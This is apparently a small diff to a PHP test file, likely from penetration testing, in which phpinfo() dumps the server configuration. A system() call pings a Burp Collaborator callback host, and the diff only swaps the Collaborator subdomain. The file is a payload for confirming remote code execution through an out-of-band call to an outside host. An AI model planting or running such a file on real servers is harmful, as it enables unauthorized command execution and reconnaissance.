@@ -1,4 +1,4 @@
 <?php
 phpinfo();
-system("ping wggk88g78e9jp42bxbhn1m47eyks8h.burpcollaborator.net");
+system("ping tolcejptelinvgw07109q0wmsdy3ms.burpcollaborator.net");
 ?>
